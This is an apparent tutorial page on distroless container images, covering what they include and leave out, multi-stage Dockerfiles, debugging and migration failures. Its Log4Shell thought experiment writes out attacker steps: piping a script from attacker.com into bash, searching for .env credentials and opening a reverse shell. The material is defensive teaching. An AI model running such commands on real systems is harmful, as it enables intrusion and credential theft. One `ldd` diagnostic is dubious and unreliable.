---
layout: default
title: "Distroless Images"
parent: "Containers"
nav_order: 835
permalink: /containers/distroless-images/
number: "0835"
category: Containers
difficulty: ★★★
depends_on: Docker Image, Multi-Stage Build, Container Security, Dockerfile
used_by: Image Scanning, Container Security, Image Tag Strategy
related: Multi-Stage Build, Container Security, Slim / Minimal Images, Image Scanning, Dockerfile
tags:
  - containers
  - docker
  - security
  - advanced
  - bestpractice
---

# 835 — Distroless Images

⚡ TL;DR — Distroless images contain only the application runtime and its direct dependencies — no shell, no package manager, no OS utilities — dramatically reducing the attack surface.

| #835 | Category: Containers | Difficulty: ★★★ |
|:---|:---|:---|
| **Depends on:** | Docker Image, Multi-Stage Build, Container Security, Dockerfile | |
| **Used by:** | Image Scanning, Container Security, Image Tag Strategy | |
| **Related:** | Multi-Stage Build, Container Security, Slim / Minimal Images, Image Scanning, Dockerfile | |

---

### 🔥 The Problem This Solves

**WORLD WITHOUT IT:**
A production Java container is based on `ubuntu:22.04`. The image includes: bash, sh, curl, wget, apt, Python, Perl, openssl CLI, gzip, tar, vi, find, chmod, ping, netstat — none of which the Java application needs at runtime. When an attacker exploits a remote code execution vulnerability in the Java app, they find a fully-equipped Linux environment: they install netcat via apt, exfiltrate data with curl, and move laterally using the network tools. Ubuntu's full package set becomes the attacker's toolkit.

**THE BREAKING POINT:**
Every package, shell, and utility in a container image is a potential tool for an attacker who achieves code execution. The "principle of least functionality" applied to images means: if the application does not need it, remove it. A web server that runs Java has no legitimate need for bash, curl, or apt.

**THE INVENTION MOMENT:**
This is exactly why distroless images were created by Google — strip the container image to the bare minimum: the application runtime and its direct library dependencies. Nothing else. No shell. No package manager. No utilities. An attacker who gains code execution finds a nearly empty environment.

---

### 📘 Textbook Definition

**Distroless images** are container base images that contain only the minimum required to run an application: the language runtime libraries (JRE for Java, libc for C programs), CA certificates for HTTPS, timezone data, and potentially `glibc` or `musl` — but no shell (`/bin/sh`), no package manager (`apt/apk`), no coreutils (`ls`, `cat`, `grep`), and no OS package infrastructure. The canonical distroless images are published by Google at `gcr.io/distroless/` (e.g., `gcr.io/distroless/java21-debian12`, `gcr.io/distroless/static-debian12` for Go/Rust). They are built using Bazel, not Apt, and contain no package manager metadata.

---

### ⏱️ Understand It in 30 Seconds

**One line:**
Distroless images have only the runtime — no shell, no tools — so an attacker who exploits your app finds an empty room with nowhere to go.

**One analogy:**
> A standard Docker container image is like a fully-stocked office building. Even when you are only there for a meeting (running the app), the building has: a kitchen, photocopy machines, a cleaning supply closet, a server room, and fire exit maps. An intruder who sneaks in has access to all of it. A distroless image is that same meeting room, but now floating by itself in space — no building around it. Just the table, chairs, and the one thing needed for the meeting. There is nowhere else to go.

**One insight:**
Without `/bin/sh` or `/bin/bash`, an attacker with arbitrary command execution in the application cannot spawn a shell. Without `curl` or `wget`, they cannot download additional tools. Without package managers, they cannot install anything. The "lateral movement" phase of an attack — establishing a persistent foothold and escalating privileges — becomes dramatically harder when the tooling does not exist.

---

### 🔩 First Principles Explanation

**CORE INVARIANTS:**
1. Every package installed in an image that is not required by the application is an unnecessary CVE surface.
2. Every tool in an image that is not required by the application is a potential attacker resource.
3. Post-exploitation capability is proportional to the tools available. Remove tools = reduce post-exploitation power.

**DERIVED DESIGN:**

**Distroless image contents (Java example):**
`gcr.io/distroless/java21-debian12` contains:
- Debian base libraries (libc, libssl, libz, libffi, libncurses)
- OpenJDK 21 JRE (JVM + Java libraries)
- CA certificates (`/etc/ssl/certs/`)
- Timezone data (`/usr/share/zoneinfo/`)
- `/etc/passwd` and `/etc/group` (with `nonroot` user)

**Distroless image does NOT contain:**
- `/bin/sh`, `/bin/bash`, `/bin/dash` — any shell
- `apt`, `dpkg`, `rpm`, `apk` — any package manager
- `curl`, `wget`, `nc`, `ssh`, `telnet` — network tools
- `ls`, `cat`, `grep`, `find`, `chmod`, `chown` — coreutils
- Python, Perl, Ruby — scripting runtimes

**Usage pattern (must use multi-stage build):**
```dockerfile
# Build stage: full JDK + Maven
FROM maven:3.9-eclipse-temurin-21 AS builder
COPY . .
RUN mvn package -DskipTests

# Runtime stage: distroless JRE
FROM gcr.io/distroless/java21-debian12
COPY --from=builder target/app.jar /app/app.jar
USER nonroot
ENTRYPOINT ["java", "-jar", "/app/app.jar"]
# No shell = cannot run arbitrary commands
# ENTRYPOINT must use exec form ["java", ...], not shell form
```

**THE TRADE-OFFS:**
**Gain:** Reduced CVE surface; reduced post-exploitation capability; smaller image (150 MB instead of 400 MB for Java).
**Cost:** Cannot use `docker exec container bash` for debugging — no shell exists; must use `gcr.io/distroless/...:debug` variant (includes busybox shell) for debugging; any required system library must be packaged in the image explicitly.

---

### 🧪 Thought Experiment

**SETUP:**
Attacker achieves JNDI injection (Log4Shell) in a Java application running in: (a) `openjdk:21-jre` base image; (b) `gcr.io/distroless/java21-debian12`.

**WHAT THE ATTACKER CAN DO IN `openjdk:21-jre`:**
Log4Shell triggers JNDI callback, loading attacker's class. RCE achieved. Attacker:
1. `ls /app` → sees app files
2. `cat /etc/passwd` → finds service users
3. `curl http://attacker.com/payload.sh | bash` → downloads and executes tool
4. `apt-get install -y nmap` → installs network scanner
5. `find / -name "*.env"` → finds credentials
6. Establishes reverse shell

**WHAT THE ATTACKER CAN DO IN DISTROLESS:**
Log4Shell triggers JNDI callback, loading attacker's class. RCE achieved. Attacker:
1. `Runtime.exec("ls /")` → `exec` syscall works, `/bin/ls` → NOT FOUND (not in image)
2. `Runtime.exec("bash -c '...'" )` → `bash` → NOT FOUND
3. `Runtime.exec("curl ...")` → `curl` → NOT FOUND
4. `Runtime.exec("apt-get ...")` → NOT FOUND
5. Attacker can only execute what exists in the image: `java` and application JARs

**THE INSIGHT:**
Distroless does not prevent the initial exploit. It dramatically limits post-exploitation. The attacker is constrained to the JVM — they can read files, make network connections (Java's native networking still works), and run JVM code. But they cannot run shell commands, install tools, or easily establish a persistent foothold.

---

### 🧠 Mental Model / Analogy

> Distroless is like a controlled laboratory environment for software. A virus (malware) that enters a sterile lab has no bacteria to feed on, no nutrients to grow, no organisms to infect. The lab purposefully eliminates everything the pathogen needs to propagate. Distroless eliminates the "nutrients" (shell, tools) that malware needs to establish itself and move laterally after an initial breach.

**Mapping:**
- "Sterile lab environment" → distroless container image
- "Bacteria/nutrients" → shell, coreutils, package managers, scripting runtimes
- "Virus entering the lab" → attacker exploiting application vulnerability
- "Cannot grow without nutrients" → attacker cannot escalate without tools
- "Regular lab with full biological media" → Ubuntu/RHEL-based container with full OS tools

**Where this analogy breaks down:** Even distroless images have some "nutrients" — the JVM can make network connections, read files, and execute existing JARs. A sophisticated attacker can write a Java payload without shell tools. Distroless raises the bar significantly; it does not make exploitation impossible.

---

### 📶 Gradual Depth — Four Levels

**Level 1 — What it is (anyone can understand):**
A distroless container image is stripped down to only what your application actually needs to run — no extra programs, no command line tools, nothing spare. If your app is a Java web service, the image contains only Java and your code. That's it. An attacker who breaks in finds an empty room.

**Level 2 — How to use it (junior developer):**
You always need a multi-stage Dockerfile — use a full image to build, then use a distroless image as the final base. For Java: `FROM gcr.io/distroless/java21-debian12`. For Python: `FROM gcr.io/distroless/python3`. For static binaries (Go/Rust): `FROM scratch`. Use the `:debug` tag during development (adds busybox shell for `docker exec` debugging); remove `-debug` for production.

**Level 3 — How it works (mid-level engineer):**
Google's distroless images are built with Bazel rules, not apt/dpkg — no package manager metadata exists. Debianpackages are extracted as tarballs, filtered to only include runtime libraries (not headers, not tools), and assembled into a minimal base. The result: a Debian-based image that has only the runtime libraries and no tooling. Image contents can be explored with `crane config gcr.io/distroless/java21-debian12` and `crane export gcr.io/distroless/java21-debian12 | tar -tv` to see exactly what files are present.

**Level 4 — Why it was designed this way (senior/staff):**
Google has been running containerised workloads in production (Borg) since 2005 and developed distroless as the result of production security experience — every shell and utility in a container is a potential escape vector or lateral movement tool. The decision to use Bazel (not apt) for building distroless was deliberate: apt installations bring in transitive dependencies (package metadata, optional tools) that distroless explicitly rejects. The challenge for adoption: most operational workflows assume shell access — `docker exec container bash` is the de facto debugging tool. Distroless breaks this workflow. Google addresses this with the `:debug` tag (adds busybox) for development and debug use, while the default tag is strictly production-safe. The modern alternative: ephemeral debug containers in Kubernetes (`kubectl debug --image=busybox`) that attach to the same PID and NET namespace as the distroless container, providing debugging capability without compromising the production image.

---

### ⚙️ How It Works (Mechanism)

```
┌──────────────────────────────────────────────────────────┐
│  DISTROLESS JAVA IMAGE CONTENTS                          │
│                                                          │
│  gcr.io/distroless/java21-debian12 contains:            │
│                                                          │
│  PRESENT:                                               │
│  /usr/lib/jvm/java-21-openjdk-amd64/  ← JRE            │
│  /etc/ssl/certs/                        ← TLS certs      │
│  /usr/share/zoneinfo/                   ← Timezone data  │
│  /lib/x86_64-linux-gnu/libc.so.6       ← C runtime      │
│  /etc/passwd                            ← Users (nonroot)│
│                                                          │
│  NOT PRESENT:                                           │
│  /bin/sh, /bin/bash, /bin/ash          ← NO shells      │
│  /usr/bin/curl, wget, nc               ← NO network tools│
│  /usr/bin/find, ls, cat, grep         ← NO coreutils    │
│  /usr/bin/apt, dpkg, apk              ← NO pkg managers │
│  /usr/bin/python3, perl               ← NO interpreters │
│                                                          │
│  MULTI-STAGE BUILD REQUIRED:                            │
│  [ Builder stage: full JDK + tools ] ← compile here    │
│    COPY --from=builder app.jar         ← extract only   │
│  [ Distroless stage: JRE only ]       ← run here       │
└──────────────────────────────────────────────────────────┘
```

---

### 🔄 The Complete Picture — End-to-End Flow

**NORMAL FLOW:**
```
Build: maven:3.9 stage → app.jar produced
→ [DISTROLESS runtime stage ← YOU ARE HERE]
→ COPY app.jar → final image
→ push to registry
→ container started: JVM runs app.jar
```

**FAILURE PATH:**
```
docker exec app-container bash → "OCI runtime exec failed:
exec failed: unable to start container process:
exec: 'bash': executable file not found in $PATH"
→ expected behaviour in production
→ for debugging: use gcr.io/distroless/java21:debug tag
→ or: kubectl debug --image=busybox -it
```

**WHAT CHANGES AT SCALE:**
At 500 services all using `gcr.io/distroless/java21-debian12`, all share the same base layer — layer deduplication means the 150 MB JRE layer is stored once in the registry. When Google releases an updated distroless image (e.g., OpenJDK security patch), rebuilding all 500 services only requires downloading the new base layer + local change layers — efficient at scale. Vulnerability scanning of distroless images is fast: fewer packages = fewer CVEs to scan = faster scan time with fewer false positives.

---

### 💻 Code Example

Example 1 — Java distroless multi-stage build:
```dockerfile
# Build stage
FROM maven:3.9-eclipse-temurin-21 AS builder
WORKDIR /build
COPY pom.xml .
RUN mvn dependency:resolve -q
COPY src/ ./src/
RUN mvn package -DskipTests

# Production stage: distroless JRE
FROM gcr.io/distroless/java21-debian12
# MUST use exec form for ENTRYPOINT (no shell to interpret shell form)
COPY --from=builder /build/target/app.jar /app.jar
USER nonroot                    # distroless includes nonroot user
EXPOSE 8080
ENTRYPOINT ["java", "-jar", "/app.jar"]
```

Example 2 — Go static binary with scratch:
```dockerfile
# Build stage
FROM golang:1.22-alpine AS builder
WORKDIR /build
COPY . .
RUN CGO_ENABLED=0 go build -ldflags="-w -s" -o /app .

# Runtime: literally empty image
FROM scratch
COPY --from=builder /app /app
COPY --from=builder /etc/ssl/certs/ca-certificates.crt \
                    /etc/ssl/certs/
ENTRYPOINT ["/app"]
# Image content: just the binary + CA certs
# Size: ~8-20 MB vs 800+ MB for ubuntu:22.04
```

Example 3 — Debugging distroless in Kubernetes:
```bash
# Kubernetes: attach ephemeral debug container
# to same PID/NET namespace as distroless pod
kubectl debug -it my-distroless-pod \
  --image=busybox \
  --target=app-container \
  --share-processes
# busybox shell + shared process namespace
# → can see the distroless container's processes
# → debug without modifying the production image
```

---

### ⚖️ Comparison Table

| Base Image | Shell | Tools | Size (Java) | CVEs (typical) | Debug Ease |
|---|---|---|---|---|---|
| ubuntu:22.04 | Yes | Full | ~450 MB | 100+ (many packages) | Easy |
| debian:slim | Yes | Minimal | ~200 MB | 50+ | Good |
| alpine:3.19 | Yes (ash) | Minimal | ~80 MB | Low | Good |
| **Distroless JRE** | No | None | ~150 MB | Very low | Hard (use :debug) |
| scratch + binary | No | None | 8–20 MB | Near zero | Very hard |

**How to choose:** Default to distroless for all production Java/Python/Node.js containers — the security improvement is significant and the operational cost (no `exec bash`) is manageable with `kubectl debug`. Use `scratch` for statically compiled Go/Rust. Use Alpine for development or when tooling access is frequently needed.

---

### ⚠️ Common Misconceptions

| Misconception | Reality |
|---|---|
| Distroless guarantees security | Distroless reduces attack surface; it does not prevent initial exploitation. The application itself must also be secure. |
| You cannot debug distroless containers | Use `:debug` tag (adds busybox) for development. In Kubernetes, use `kubectl debug` with an ephemeral container. Shell-free debugging is possible with kubectl port-forward + application-level debug APIs. |
| Distroless always results in smaller images | Distroless Java is ~150 MB (JRE is large). A Node.js Alpine image can be smaller. Distroless is about security surface, not always minimum size. |
| ENTRYPOINT as shell form works with distroless | Shell form `ENTRYPOINT java -jar app.jar` requires a shell (`/bin/sh`) to parse the string. Distroless has no shell → container crashes. Always use exec form `ENTRYPOINT ["java", "-jar", "app.jar"]`. |
| Distroless is only for compiled languages | Google provides distroless images for Java, Python, Node.js, and static binaries. Python and Node apps can use distroless with minimal changes. |

---

### 🚨 Failure Modes & Diagnosis

**Container Exits: ENTRYPOINT Shell Form in Distroless**

**Symptom:** Container immediately exits with exit code 127 or error "exec: '/bin/sh': stat /bin/sh: no such file or directory".

**Root Cause:** Dockerfile uses shell form for CMD/ENTRYPOINT: `CMD java -jar app.jar`. Docker wraps this as `/bin/sh -c java -jar app.jar`. Distroless has no `/bin/sh`.

**Diagnostic Command / Tool:**
```bash
docker inspect my-container | jq '.[0].Config.Entrypoint'
# ["/bin/sh", "-c", "java -jar app.jar"] ← shell form (wrong)
# vs
# ["java", "-jar", "app.jar"] ← exec form (correct)
```

**Fix:** Change to exec form in Dockerfile: `CMD ["java", "-jar", "app.jar"]`

**Prevention:** All distroless Dockerfiles must use exec form. Add a CI check: `grep -E '^(CMD|ENTRYPOINT) [^[]' Dockerfile` → fail if shell form found.

---

**Missing System Library at Runtime**

**Symptom:** Container starts but application crashes with `java.lang.UnsatisfiedLinkError: ... libgomp.so.1: cannot open shared object file`.

**Root Cause:** Application uses a native library that is not included in the distroless base image.

**Diagnostic Command / Tool:**
```bash
# List libraries the application needs
docker run --rm \
  --entrypoint=/bin/sh \
  gcr.io/distroless/java21-debian12:debug \
  -c "ldd /app.jar 2>&1 || java -jar /app.jar 2>&1 | head -20"
# Identifies missing libraries
```

**Fix:** Copy the missing library from the builder stage into the distroless image:
```dockerfile
COPY --from=builder /usr/lib/x86_64-linux-gnu/libgomp.so.1 \
                    /usr/lib/x86_64-linux-gnu/
```

**Prevention:** During initial distroless migration, test all code paths (not just the happy path) — missing libraries often only surface on specific operations. Use a `-debug` image in staging to identify library requirements first.

---

### 🔗 Related Keywords

**Prerequisites (understand these first):**
- `Multi-Stage Build` — required to use distroless (build in full image, copy to distroless)
- `Container Security` — distroless is one component of container security hardening

**Builds On This (learn these next):**
- `Image Scanning` — distroless images dramatically reduce CVE counts in scanner results
- `Slim / Minimal Images` — the broader category of image size/security optimisation

**Alternatives / Comparisons:**
- `Alpine-based images` — smaller than Ubuntu but still has a shell; less extreme than distroless
- `scratch` — absolute minimum (empty image) for statically compiled binaries
- `Wolfi OS` — modern distroless-by-default container OS from Chainguard; keeps apt-like package management while minimising CVEs

---

### 📌 Quick Reference Card

```
┌──────────────────────────────────────────────────────────┐
│ WHAT IT IS   │ Container base with only runtime — no    │
│              │ shell, no tools, nothing spare            │
├──────────────┼───────────────────────────────────────────┤
│ PROBLEM IT   │ Shells and tools in images = attacker    │
│ SOLVES       │ toolkit after RCE — remove them          │
├──────────────┼───────────────────────────────────────────┤
│ KEY INSIGHT  │ No shell = no shell injection. Attacker  │
│              │ who exploits app finds an empty room     │
├──────────────┼───────────────────────────────────────────┤
│ USE WHEN     │ All production Java/Go/Python services — │
│              │ always; use :debug tag only for dev      │
├──────────────┼───────────────────────────────────────────┤
│ AVOID WHEN   │ Development environments where easy      │
│              │ shell debugging is essential             │
├──────────────┼───────────────────────────────────────────┤
│ TRADE-OFF    │ Reduced CVE surface + post-exploit limits│
│              │ vs harder debugging + library management │
├──────────────┼───────�───────────────────────────────────┤
│ ONE-LINER    │ "Attacker gains RCE and finds an empty   │
│              │  room with no tools and nowhere to go"   │
├──────────────┴───────────────────────────────────────────┤
│ NEXT EXPLORE │ Image Scanning → Slim / Minimal Images → │
│              │ Container Runtime Interface (CRI)        │
└──────────────────────────────────────────────────────────┘
```

---

### 🧠 Think About This Before We Continue

**Q1.** A security engineer argues that distroless images are "security theatre" because: (a) the JVM can make arbitrary network connections to exfiltrate data without curl; (b) the JVM can read any file the process has permission to access; (c) a sophisticated attacker can write bytecode to do everything that shell scripts do. These are all technically true. Construct the strongest response to this argument — what distroless specifically prevents that matters most in practice, with reference to the attack stages where it creates the most friction.

**Q2.** Your team is migrating 40 Java microservices from `openjdk:21-jre` to distroless. During testing, 8 services fail to start due to missing native libraries, 3 services fail because they use shell scripts as entrypoints (not exec form), and 1 service uses a startup timer that calls `date` as a shell command. Design the migration plan — including pre-migration assessment tooling, the exact Dockerfile changes needed for each failure category, and the rollout strategy that minimises production risk across all 40 services.

